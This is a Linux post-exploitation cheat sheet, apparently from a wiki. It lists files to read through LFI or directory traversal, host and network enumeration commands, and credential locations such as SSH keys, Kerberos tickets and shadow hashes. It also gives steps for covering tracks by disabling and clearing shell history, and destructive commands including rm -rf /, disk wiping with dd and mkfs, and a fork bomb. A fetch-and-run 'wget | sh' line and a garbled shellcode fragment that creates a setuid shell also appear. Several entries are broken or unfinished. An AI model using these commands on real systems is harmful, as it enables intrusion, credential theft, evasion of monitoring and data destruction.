Information

Blind Files
(things to pull when all you can do is blindly read) LFI/dir traversal (Don’t forget %00!)

File
Contents and Reason
/etc/resolv.conf

 
Contains the current name servers (DNS) for the system. This is a globally readable file that is less likely to trigger IDS alerts than /etc/passwd
/etc/motd
Message of the Day. 
/etc/issue
Debian - current version of distro
/etc/passwd
List of local users 
/etc/shadow
List of users’ passwords’ hashes (requires root)
/home/xxx/.bash_history
Will give you some directory context
System

top -n 1 -d
Print process, 1 is a number of lines
id
Your current username, groups
arch, uname -m
Kernel processor architecture        
w
who is connected, uptime and load avg
who -a
uptime, runlevel, tty, proceses etc.        
gcc -v
Returns the version of GCC.
mysql --version
Returns the version of MySQL.
perl -v
Returns the version of Perl.
ruby -v
Returns the version of Ruby.
python --version

dmesg    
Informations from the last system boot
lspci
prints all PCI buses and devices
lsusb
prints all USB buses and devices/h
lscpu

lshw


ex


cat /proc/cpuinfo
        
cat /proc/meminfo


du -h --max-depth=1 /
(note: can cause heavy disk i/o)
which nmap
locate a command (ie nmap or nc)

locate bin/nmap


locate bin/nc


jps -l


java -version
Returns the version of Java.


Networking
hostname -f
ip addr show
ip ro show
ifconfig -a
route -n
cat /etc/network/interfaces
iptables -L -n -v
iptables -t nat -L -n -v
ip6tables -L -n -v
iptables-save
netstat -anop
netstat -r
netstat -nltupw (root with raw sockets)
arp -a
lsof -nPi

The information returned by these commands can also be acquired through “cat /proc/net/*”. This is less likely to trigger monitoring alerts. The drawback is that it generates a lot of information which then has to be analyzed.
User accounts
     local accounts: cat /etc/passwd
password hashes in /etc/shadow on Linux
password hashes in /etc/security/passwd on AIX
groups in /etc/group (and/or /etc/gshadow on Linux)
all accounts: getent passwd
should dump local, LDAP, NIS, whatever the system is using
same with getent group
Samba’s own database: pdbedit -L -w or pdbedit -L -v
privileged accounts: cat     
(above: cat ???)
mail aliases: cat /etc/aliases find /etc -name aliases, getent aliases 
NIS accounts: ypcat passwd - displays NIS password file

Credentials
SSH keys, often passwordless: /home/*/.ssh/id*
SSH agent:

Kerberos tickets: /tmp/krb5cc_*, /tmp/krb5.keytab
PGP keys: /home/*/.gnupg/secring.gpgs

Covering Your Tracks
Avoiding history filesmys
export HISTFILE=
or 
unset HISTFILE
This next one might not be a good idea, because a lot of folks know to check for tampering with this file, and will be suspicious if they find out:    

However if you happen to be on an account that was originally inaccessible, if the .bash_history file is available (ls -a ~), viewcating its contents can provide you with a good deal of information about the system and its most recent updates/changes.  
clear all history in ram
history -c
rm -rf ~/.bash_history && ln -s ~/.bash_history /dev/null (invasive)
touch ~/.bash_history (invasive)
<space> history -c (using a space before a command)    
zsh% unset HISTFILE HISTSIZE    
tcsh% set history=0    
bash$ set +o history
ksh$ unset HISTFILE
find / -type f -exec {} (forensics nightmare)

Note that you’re probably better off modifying or temporary disabling rather than deleting history files, it leaves a lot less traces and is less suspect.

In some cases HISTFILE and HISTFILESIZE are made read-only; get around this by explicitly clearing history (history -c) or by kill -9 $$’ing the shell. Sometimes the shell can be configured to run ‘history -w’ after every command; get around this by overriding ‘history’ with a no-op shell function. None of this will help if the shell is configured to log everything to syslog, however.

Fun if Windows is present and accessible
If there is Windows installed and the logged-in user access level includes those Windows partition, attacker can mount them up and do a much deeper information gathering, credential theft and root-ing. Ntfs-3g is useful for mounting ntfs partitions read-write.
TODO: insert details on what to look for

Stuff to be sorted
## GOING TO MOVE EVERYTHING HERE FOR LEGIBILITY ONCE EDITING DIES DOWN

Command    
Output
ps aux        
List of running processes
id
List current user and group along with user/group id        
w
Show info about who is logged, what are they are doing        
who -a
Print information about users        
cat /dev/core > /dev/audio

cat /dev/mem > /dev/audio
Makes a sound from the memory content.
Usefulness of this??? (none, aside from pissing off the sysadmin, in the very unlikely case that the server has speakers and the legacy OSS driver)
sudo -p
allows the user to define what the password prompt will be
(useful for fun customization with aliases or shell scripts)
Deleting and Destroying
(If it is necessary to leave the machine inaccessible or unusable)
Note that this tends to be quite evident (as opposed to a simple exploitation that might go unnoticed for some time, even forever), and will most surely get you into troubles.

Oh, and you’re probably a jerk if you use any of the stuff below.
Command

rm -rf /
This will recursively try to delete all files.
char esp[] __attribute__ ((section(”.text”))) /* e.s.p release */ = “\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68?

“cp -p /bin/sh /tmp/.beyond; chmod 4755 /tmp/.beyond;”;    
Hex version of rm -rf /    
How is this supposed to work?


mkfs.ext3 /dev/sda
Reformat the device mentioned, making recovery of files hard.        
dd if=/dev/zero of=/dev/sda bs=1M
Overwrite disk /dev/sda with zeros
Execute a remote script

wget http://server/file.sh -O- | sh
This command forces the download of a file and immediately its execution, can be exploited easily using or reverse shit        
Fork Bomb
:(){:|:&};:


The [in]famous "fork bomb". This command will cause your system to run a large number of processes, until it "hangs". This can often lead to data loss (e.g. if the user brutally reboots, or the OOM killer kills a process with unsaved work). If left alone for enough time a system can eventually recover from a fork bomb.

World 
writable 
directories


Find word writable folders outside your home directory. It would be a tremendous success if we could write, say to /etc. So we could add configuration files and therefore pretty sure execute code as root, since many daemons read a specific number of primary and secondary configuration files, whereas the secondary ones are often not created yet. If the superusers home (/root) would be writable, we could create shell startup files that doesn't exist yet: .profile, 
.bash_profile, .bashrc...
find / \( ­wholename 
'/home/homedir/*' ­prune \) ­o \
( ­type d ­perm ­0002 \) ­exec 
ls ­ld '{}' ';' 2>/dev/null


World 
writable files
What if /etc/passwd would be writable? Yeah, we just could add another root user and we would have won! Whereas the foregoing scenario is just too good to be 
true, it really makes sense to search for world writable files outside your own territory (= your home directory).
find / \( ­wholename 
'/home/homedir/*' ­prune ­o 
­wholename '/proc/*' ­prune \) 
­o \( ­type f ­perm ­0002 \) 
­exec ls ­l '{}' ';' 2>/dev/null
Logfiles
Sometimes a security unaware administrator chmods a sensitive log file, because he couldn't view it and therefore leaks potentially sensitive data such as 
passwords or other important information.
find /var/log ­type f ­perm 
­0004 2>/dev/null
Setuid / setgid files
We already examined fully why setuid and setgid files are worth to be double checked. Such a file owned by root and susceptible for attacks is a big weakness.
find / \( ­type f ­or ­type d \)
­perm ­6000 2>/dev/null
